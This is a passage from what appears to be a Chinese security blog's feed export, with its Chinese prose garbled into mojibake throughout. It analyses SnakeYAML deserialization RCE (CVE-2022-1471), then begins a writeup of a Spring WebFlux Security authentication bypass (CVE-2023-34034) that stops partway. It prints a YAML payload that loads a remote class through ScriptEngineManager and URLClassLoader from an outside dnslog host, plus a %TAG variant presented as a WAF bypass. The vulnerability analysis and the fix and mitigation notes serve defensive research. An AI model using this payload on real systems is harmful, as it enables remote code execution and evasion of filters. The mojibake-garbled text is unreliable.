<p>åœ¨composeSequenceNodeæ–¹æ³•ä¸­é¦–å…ˆè®¾ç½®äº‹ä»¶ä¸ºSequenceStartEventï¼Œå³åºåˆ—å¤„ç†å¼€å§‹ï¼Œç„¶åä¼šå°è¯•è·å–Tagï¼Œå…³äºtagçš„å†…å®¹å¯ä»¥åœ¨<a href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthandsäº†è§£ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªSequenceNodeå¯¹è±¡ï¼Œåœ¨æ„é€ SequenceNodeå¯¹è±¡æ—¶ä¼šå°†childrenå½“ä½œå‚æ•°ä¼ è¿›å»èµ‹å€¼ç»™å±æ€§this.valueï¼Œæˆ‘ä»¬çŸ¥é“ArrayListæ˜¯å¼•ç”¨ç±»å‹ï¼Œè‹¥ä»¥å¤–ç§’å¯¹childrençš„ä¿®æ”¹å°†å½±å“åˆ°SequenceNodeä¸­çš„å€¼ã€‚ç„¶åå—²ç”¨composeNodeæ–¹æ³•ç»§ç»­è¿›è¡ŒèŠ‚ç‚¹åè§å¹¶æ·»åŠ åˆ°childrenä¸­ä½œä¸ºSequenceNodeçš„å­èŠ‚ç‚¹ã€‚åˆ°è¿™é‡Œå°±å·²ç»å¼€å§‹é€’å½’è§£æäº†ï¼Œç›´åˆ°è§£æåˆ°StreamEndã€‚</a></p>
<p><img src="/archives/f98d45ce/image-20230814170947063.png" alt="image-20230814170947063"></p>
<p>åœ¨è·å–åˆ°Nodeåï¼Œå°±è¿›å…¥åˆ°ç›®æ ‡å¯¹è±¡æ„å»ºçš„æµç¨‹ä¸­</p>
<p><img src="/archives/f98d45ce/image-20230814172249327.png" alt="image-20230814172249327"></p>
<p>åœ¨constructObjectæ–¹æ³•ä¸­è¿˜å¯¹è·å–åˆ°çš„nodeå¯¹è±¡è¿›è¡Œäº†ç¼“å­˜æ£€æŸ¥</p>
<p><img src="/archives/f98d45ce/image-20230814172306770.png" alt="image-20230814172306770"></p>
<p>åœ¨è°ƒç”¨getConstructoræ—¶ä¼šé¦–å…ˆä»é¢„è®¾å¥½çš„13ä¸­å†…ç½®æ„é€ å™¨ä¸­å°è¯•é€‰æ‹©ï¼Œè‹¥æ²¡æœ‰åŒ¹é…çš„åˆ™è¿”å›ä¸€ä¸ªConstructYamlObjectçš„æ„é€ å™¨ï¼Œç„¶åè°ƒç”¨å™¨ConstructYamlObjectçš„getConstructoræ–¹æ³•é€šè¿‡åå°„çš„æ–¹å¼è·å¾—ç›®æ ‡ç±»çš„Classå®ä¾‹ï¼Œç„¶åæ ¹æ®Nodeç±»å‹è·å–åˆ°ä¸åŒçš„å‡ ç‚¹æ„é€ å™¨ï¼Œæ­¤å¤„ä¸ºContructSequence</p>
<p>ç„¶åè°ƒç”¨å™¨constructæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¹Ÿæ—¶é€šè¿‡èŠ‚ç‚¹tagçš„ä¸åŒç±»å‹é€‰æ‹©ä¸åŒçš„å¤„ç†é€»è¾‘ï¼Œè¿™é‡Œä¼šè¿›å…¥åˆ°å¯å˜å¯¹è±¡çš„å¯¹è±¡æ„å»ºé€»è¾‘ä¸­ã€‚ç”±ä¸‹å›¾ï¼Œåœ¨è¿™ä¸ªé€»è¾‘ä¸­ä¼šé¦–å…ˆè·å–å½“å‰Nodeçš„valueå±æ€§ï¼Œä¹Ÿå°±æ˜¯å­èŠ‚ç‚¹çš„å°ºå¯¸ç„¶åä¸è·å¾—çš„ç›®æ ‡ç±»çš„æ„é€ æ–¹æ³•çš„å‚æ•°å°ºå¯¸è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥æˆåŠŸåŒ¹é…åˆ™ä¾æ¬¡å¯¹ç›´æ¥ç‚¹è°ƒç”¨constructObjecé€’å½’æ„å»ºå¯¹è±¡ç„¶åä½œä¸ºçˆ¶èŠ‚ç‚¹çš„æ„é€ æ–¹æ³•å‚æ•°ä¼ å‚åŒé€šè¿‡åå°„çš„æ–¹å¼è¿›è¡Œå®ä¾‹åŒ–ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814173636570.png" alt="image-20230814173636570"></p>
<p>åœ¨æˆ‘ä»¬æä¾›çš„payloadä¸­ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆæˆ‘ä»¬è¦æ„å»ºçš„ç±»æ˜¯javax.script.ScriptEngineManagerï¼Œæ„é€ è¯¥ç±»è°ƒç”¨çš„æ˜¯å…¶å«æœ‰ä¸€ä¸ªå‚æ•°çš„æœ‰å‚æ„é€ æ–¹æ³•ï¼Œå…¶å‚æ•°ä¸ºä¸€ä¸ªç±»åŠ è½½å™¨java.net.URLClassLoaderï¼Œè€Œåœ¨æ„é€ java.net.URLClassLoaderæ—¶ä¹Ÿæ˜¯è°ƒç”¨å…¶å«æœ‰ä¸€ä¸ªå‚æ•°çš„æœ‰å‚æ„é€ æ–¹æ³•ä¸è¿‡å…¶å‚æ•°æ—¶ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šè€ƒåˆ°java.net.URLClassLoaderååµŒå¥—äº†ä¸¤å±‚[[ï¼Œå…¶æ•°ç»„ç±»å‹ä¸ºjava.net.URLã€‚æˆ‘ä»¬çŸ¥é“URLClassLoaderä¼šä»ä¼ å…¥çš„URLè¿›è¡Œè¿œç¨‹çš„ç±»åŠ è½½å·¥ä½œï¼Œé‚£ä¹ˆè¿™ä¸ªpayloadææœ‰å¯èƒ½æ¶‰åŠåˆ°è¿œç¨‹æ¶æ„ç±»åŠ è½½ä¸å®ä¾‹åŒ–ã€‚é‚£ä¹ˆScriptEngineManagerçš„æ„é€ æ–¹æ³•åˆåšäº†ä»€ä¹ˆå‘¢</p>
<p><img src="/archives/f98d45ce/image-20230814174418936.png" alt="image-20230814174418936"></p>
<p><img src="/archives/f98d45ce/image-20230814174500741.png" alt="image-20230814174500741"></p>
<p><img src="/archives/f98d45ce/image-20230814174437825.png" alt="image-20230814174437825"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„SPIè°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿œç¨‹éƒ¨ç½²ä¸€ä¸ªå®ç°äº†ScriptEngineFactoryæ¥å£çš„ç±»ï¼Œå¹¶å­å•Šå…¶é™æ€ä»£ç å—ä¸­å†™å…¥å‘½ä»¤æ‰§è¡Œçš„ä»£ç ï¼Œå¹¶åœ¨å…¶Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactoryæ–‡ä»¶ä¸­åº”ç”¨è¯¥å®ç°ç±»å³å¯å®Œæˆåˆ©ç”¨ã€‚å…·ä½“çš„è¿œç¨‹RCEå¯ä»¥ä¸Šç½‘è‡ªè¡Œå¯»æ‰¾ã€‚</p>
<p>åœ¨æœ€æ–°ç‰ˆçš„snakeä¸­è¯¥æ¼æ´å¾—åˆ°äº†ä¿®å¤ï¼Œå®˜æ–¹é€šè¿‡åœ¨loadConfigså¯¹è±¡ä¸­å¼•å…¥äº†æ–°çš„é…ç½®é¡¹å¹¶ä¸”é™åˆ¶äº†ååºåˆ—åŒ–é€’å½’è°ƒç”¨åµŒå¥—æ·±åº¦çš„æ–¹å¼æ¥å¯¹ååºåˆ—åŒ–æ¼æ´è¿›è¡Œäº†é™åˆ¶ã€‚</p>
<p>é™åˆ¶é€’å½’æ·±åº¦åœ¨org.yaml.snakeyaml.composer.Composer#increaseNestingDepthæ–¹æ³•ä¸­æ£€æŸ¥ï¼Œæœ€å¤§æ·±åº¦é»˜è®¤ä¸º50å±‚</p>
<p><img src="/archives/f98d45ce/image-20230814193403071.png" alt="image-20230814193403071"></p>
<p>ç›®æ ‡ç±»ç±»å‹æ£€æŸ¥åœ¨ä¸‹å›¾å¤„æ£€æŸ¥ï¼Œé¦–å…ˆèŠ‚ç‚¹Tagæ˜¯å¦æ˜¯è‡ªå®šä¹‰çš„å…¨å±€tagå¦‚æœæ˜¯åˆ™è°ƒç”¨org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowedæ–¹æ³•è¿›è¡Œæ£€æŸ¥ï¼ŒTagInspectoræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶é»˜è®¤å®ç°æ˜¯org.yaml.snakeyaml.inspector.UnTrustedTagInspectorã€‚isGlobalTagAllowedæ–¹æ³•é»˜è®¤è¿”å›falseï¼Œå³ä¸å…è®¸ä½¿ç”¨å…¨å±€çš„Tagã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814193503552.png" alt="image-20230814193503552"></p>
<p>æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™å¦‚æœéœ€è¦æŒ‡å®šå‘åºåˆ—åŒ–çš„ç›®æ ‡ç±»ç±»å‹åˆ™å¿…é¡»è¦å®ç°TagInspectoræ¥å£ï¼Œé‡å†™isGlobalTagAllowedæ–¹æ³•ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°LoaderOptionså®ä¾‹åŒ–å¯¹è±¡ä¸­ã€‚</p>
<p>é»˜è®¤ä¸å…è®¸ä½¿ç”¨å…¨å±€tag</p>
<p><img src="/archives/f98d45ce/image-20230814194127911.png" alt="image-20230814194127911"></p>
<p>å®ç°TagInspectoræ¥å£ï¼Œæ­¤å¤„ç›´æ¥è¿”å›trueï¼Œä¹Ÿå¯ä»¥åœ¨isGlobalTagAllowedæ–¹æ³•ä¸­æ ¹æ®tagæ¥è¿›è¡Œé€»è¾‘åˆ¤æ–­å†³å®šå…è®¸å“ªäº›ç±»èƒ½è¢«ååºåˆ—åŒ–ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814194330452.png" alt="image-20230814194330452"></p>
<p>é‡å†™isGlobalTagAllowedæ–¹æ³•åçš„ç»“æœ</p>
<p><img src="/archives/f98d45ce/image-20230814194609615.png" alt="image-20230814194609615"></p>
<p>è¿œç¨‹ç±»åŠ è½½</p>
<p><img src="/archives/f98d45ce/image-20230814194851114.png" alt="image-20230814194851114"></p>
<p>åœ¨åˆ†æçš„è¿‡ç¨‹ä¸­æˆ‘å‘ç°äº†ä¸€äº›å¥½ç©çš„åœ°æ–¹ï¼Œæ‰‹ä¸‹æ—¶é™¤äº†loadæ–¹æ³•å¯ä»¥åˆ©ç”¨è¯¥payloadå¤–ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨çš„æ—¶loadAsæ–¹æ³•è¢«äººåˆ¶å®šäº†ç›®æ ‡ç±»çš„ç±»å‹åº”è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>å½“ç„¶å¦‚æœç±»å‹ä¸åŒ¹é…ï¼Œå³ScriptEngineFactoryå¦‚æœä¸æ˜¯ç›®æ ‡ç±»çš„å­ç±»æˆ–è¿™å®ç°ç±»ï¼Œå°±æ²¡å¾—ç©ï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸€äº›æŠ½è±¡çº§åˆ«æ¯”è¾ƒé«˜çš„ç±»è¿˜æ˜¯å¤§æœ‰å¯ä¸ºçš„ï¼Œæ¯”å¦‚xxxxç»„ä»¶å°±æ˜¯è¿™ä¹ˆå¹²çš„ï¼Œå—¯ä¸€ä¸ªCVEåˆ°æ‰‹äº†ã€‚</p>
<p>ä¸¤å¤–æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Yamlè¯­æ³•ä¸­çš„TAGç‰¹æ€§æ¥å®ç°WAFç»•è¿‡ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹payloadè¿›è¡Œä»¥ä¸‹çš„å˜å½¢</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<p>ä¾æ—§RCEï¼Œè¿˜å¯ä»¥ç”¨æ¥ç»•WAF</p>
<p><img src="/archives/f98d45ce/image-20230814195046711.png" alt="image-20230814195046711"></p>
<h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><ol>
<li>å‡çº§è½¯ä»¶åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬æˆ–æœ€æ–°ç‰ˆï¼Œæœ€æ–°ç‰ˆmavenä»“åº“åœ°å€ï¼š<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1ã€‚</a></li>
<li>é™åˆ¶æœåŠ¡å™¨å‡ºç½‘</li>
</ol>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
<li><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
<li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
<li><a href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>æ¼æ´</tag>
        <tag>SnakeYaml</tag>
        <tag>CVE-2022-1471</tag>
      </tags>
  </entry>
  <entry>
    <title>WebFlux Security è®¤è¯ç»•è¿‡ï¼ˆCVE-2023-34034ï¼‰</title>
    <url>/archives/fe3c6472.html</url>
    <content><![CDATA[<h1 id="WebFlux-Security-è®¤è¯ç»•è¿‡ï¼ˆCVE-2023-34034ï¼‰"><a href="#WebFlux-Security-è®¤è¯ç»•è¿‡ï¼ˆCVE-2023-34034ï¼‰" class="headerlink" title="WebFlux Security è®¤è¯ç»•è¿‡ï¼ˆCVE-2023-34034ï¼‰"></a>WebFlux Security è®¤è¯ç»•è¿‡ï¼ˆCVE-2023-34034ï¼‰</h1><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>Spring WebFlux æ˜¯ Spring Framework 5.0 ä¸­å¼•å…¥çš„æ–°çš„å“åº”å¼Webæ¡†æ¶ã€‚ä¸Spring MVCä¸åŒï¼Œå®ƒä¸éœ€è¦Servlet APIï¼Œæ˜¯å®Œå…¨å¼‚æ­¥ä¸”éé˜»å¡çš„ï¼Œå¹¶ä¸”é€šè¿‡Reactoré¡¹ç›®å®ç°äº†Reactive Streamsè§„èŒƒã€‚Spring WebFlux å¯ç”¨äºåˆ›å»ºåŸºäºäº‹ä»¶å¾ªç¯æ‰§è¡Œæ¨¡å‹çš„å®Œå…¨å¼‚æ­¥ä¸”éé˜»å¡çš„åº”ç”¨ç¨‹åºã€‚</p>
<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å½“WebFluxä½¿ç”¨äº†Spring Securityè¿›è¡Œç”¨æˆ·è®¤è¯ä¸é‰´æƒæ—¶ï¼Œè‹¥é”™è¯¯åœ°ä½¿ç”¨äº†æ— å‰å¯¼â€&#x2F;â€œçš„è·¯å¾„é€šé…ç¬¦â€**â€œï¼Œç¨‹åºå°†å› ä¸ºWebFluxä¸Spring Securityå¯¹å…¶ä¸åŒçš„è§£ææ¨¡å¼å·®å¼‚å¯¼è‡´å¯èƒ½çš„è®¤è¯ç»•è¿‡ã€‚</p>
<span id="more"></span>

<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><ul>
<li>6.1.0 to 6.1.1</li>
<li>6.0.0 to 6.0.4</li>
<li>5.8.0 to 5.8.4</li>
<li>5.7.0 to 5.7.9</li>
<li>5.6.0 to 5.6.11</li>
</ul>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h3><p>ä½¿ç”¨ideaæ–°å»ºåŸºäºmavençš„javaé¡¹ç›®ï¼Œåœ¨pom.xmlä¸­å¼•å…¥ç›¸å…³ä¾èµ–åŒ…</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssawt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>SpringSecurityAndWebfluxTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>SpringSecurityAntWebfluxTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨spring-boot-starter-parentç‰ˆæœ¬ä¸º2.6.14ï¼Œå…¶ä¾èµ–çš„Spring Securityç‰ˆæœ¬ä¸º5.6.9ï¼Œä¸ºå­˜åœ¨æ¼æ´ç‰ˆæœ¬ï¼›</p>
<p>ä¸ºäº†å¯¹æ¯”ï¼Œä½¿ç”¨spring-boot-starter-parentç‰ˆæœ¬2.7.14ä½œä¸ºæ¼æ´ä¿®å¤ç‰ˆæœ¬ï¼Œå…¶ä¾èµ–çš„Spring Security ç‰ˆæœ¬ä¸º5.7.10ï¼Œä¸ºä¿®å¤ç‰ˆæœ¬ã€‚</p>
<p>ä¸ºäº†èƒ½å¤Ÿè¿›è¡Œæ¼æ´å¤ç°ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨WebFluxç¼–å†™ä¸€éƒ¨åˆ†ä»£ç ï¼Œå¹¶ä½¿ç”¨Spring Securityä½œä¸ºè®¤è¯æ¡†æ¶ã€‚</p>
<p><img src="/archives/fe3c6472/image-20230822100900918.png" alt="image-20230822100900918"></p>
<p>ä¸Šå›¾æ˜¯è°ƒè¯•ä»£ç çš„ç»“æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨Spring Bootæ¥æ­å»ºé¡¹ç›®ï¼Œå¹¶ç¼–å†™äº†ä¸€ä¸ªæ§åˆ¶å™¨<code>HelloController</code>ï¼Œè¯¥æ§åˆ¶å™¨ä¸­å®šä¹‰äº†ä¸€ä¸ªè·¯ç”±å¤„ç†æ–¹æ³•ï¼Œå³æ‰€æœ‰è®¿é—®<code>http://127.0.0.1:8080/hello-dev/xxxx</code>çš„è¯·æ±‚éƒ½ç”±è¯¥æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚</p>
<p><img src="/archives/fe3c6472/image-20230822101052260.png" alt="image-20230822101052260"></p>
<p>å¦å¤–è®¾ç½®äº†5ä¸ªå“åº”å¤„ç†å™¨ï¼Œåˆ†åˆ«å¯¹æ— è®¿é—®æƒé™ã€æœªè®¤è¯ã€è®¤è¯å¤±è´¥ã€è®¤è¯æˆåŠŸã€ç™»å‡ºæˆåŠŸçš„æƒ…å†µè¿›è¡Œå¤„ç†ã€‚åœ¨<code>AuthorizationConfig</code>ä¸­å®šä¹‰äº†åŸºäºå†…å­˜çš„ç”¨æˆ·åå¯†ç ä»¥åŠè·¯ç”±è§„åˆ™</p>
<p><img src="/archives/fe3c6472/image-20230822101411599.png" alt="image-20230822101411599"></p>
<p>å…³äºå¦‚ä½•åœ¨WebFluxä¸­ä½¿ç”¨Spring Securityå¯ä»¥å‚è€ƒè¯¥æ–‡ç« ï¼š<a href="https://juejin.cn/post/7220662065294770233">https://juejin.cn/post/7220662065294770233</a></p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äºåªæœ‰æ¼æ´ç¼–å·çš„æ¼æ´ï¼Œæˆ‘ä»¬è‹¥è¦è¿›è¡Œå¤ç°ï¼Œç¬¬ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä¿¡æ¯æ”¶é›†æ˜¯ä¸ºäº†è¾¾æˆä»¥ä¸‹å‡ ä¸ªç›®çš„ï¼š</p>
<ul>
<li>è·å–å®˜æ–¹æˆ–è€…ç¬¬ä¸‰æ–¹æ¼æ´é€šå‘Šä¸­å…³äºæ¼æ´æè¿°çš„è››ä¸é©¬è¿¹ï¼Œè¿™äº›é€šå‘Šä¸­çš„æ¼æ´æè¿°å¾€å¾€æ³„éœ²å¤§é‡çš„ä¿¡æ¯ï¼›</li>
<li>æ˜¯å¦å·²æœ‰å®‰å…¨ç ”ç©¶å‘˜æŠ«éœ²æ¼æ´è¯¦æƒ…ï¼›</li>
<li>æ¼æ´æ˜¯å¦ä¿®å¤ï¼Œä¿®å¤çš„Commit IDæ˜¯å¤šå°‘ã€‚</li>
</ul>
<p>å¯¹äºè¯¥æ¼æ´æ¥è¯´ï¼ŒSpring å®˜æ–¹å‘å¸ƒäº†ä¸€åˆ™é€šå‘Šï¼š</p>
<p><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></p>
<p><img src="/archives/fe3c6472/image-20230822102006591.png" alt="image-20230822102006591"></p>
<p>åœ¨è¯¥æ¼æ´æè¿°ä¸­æåˆ°ï¼Œåœ¨WebFluxä¸­ä¸ºSpring Securityé…ç½®ä½¿ç”¨â€**â€è¿™ç§æ¨¡å¼çš„æ­£åˆ™å°†å¯¼è‡´Spring Security ä¸ Spring WebFluxçš„è¡Œä¸ºä¸ä¸€è‡´ä»è€Œå¯¼è‡´è®¤è¯ç»•è¿‡ã€‚è¿™é‡Œå¯ä»¥æå–åˆ°ä¸€ä¸ªå…³é”®ç‚¹å°±æ˜¯éœ€è¦åœ¨Spring Securityä¸­ä½¿ç”¨â€**&quot;è¿›è¡Œæ¨¡å¼åŒ¹é…æ‰ä¼šå¯¼è‡´æ¼æ´ã€‚å½“ç„¶è¿™ç‚¹ä¿¡æ¯å¯èƒ½ä¸å¤ªå¤Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­æœç´¢ï¼Œäºæ˜¯å‘ç°äº†ä¸‹é¢è¿™ç¯‡å¸–å­ï¼š</p>
<p><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></p>
<p><img src="/archives/fe3c6472/image-20230822102343166.png" alt="image-20230822102343166"></p>
